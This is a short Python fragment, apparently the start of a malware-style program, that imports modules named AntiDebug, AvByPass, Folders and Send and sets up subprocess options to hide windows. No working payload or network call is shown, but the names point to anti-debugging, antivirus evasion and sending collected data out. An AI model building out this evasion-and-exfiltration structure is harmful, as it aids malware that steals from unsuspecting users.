from manager.antiDebug import AntiDebug
from manager.avbypass import AvByPass
from manager.folders import Folders
from manager.send import Send

import subprocess
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW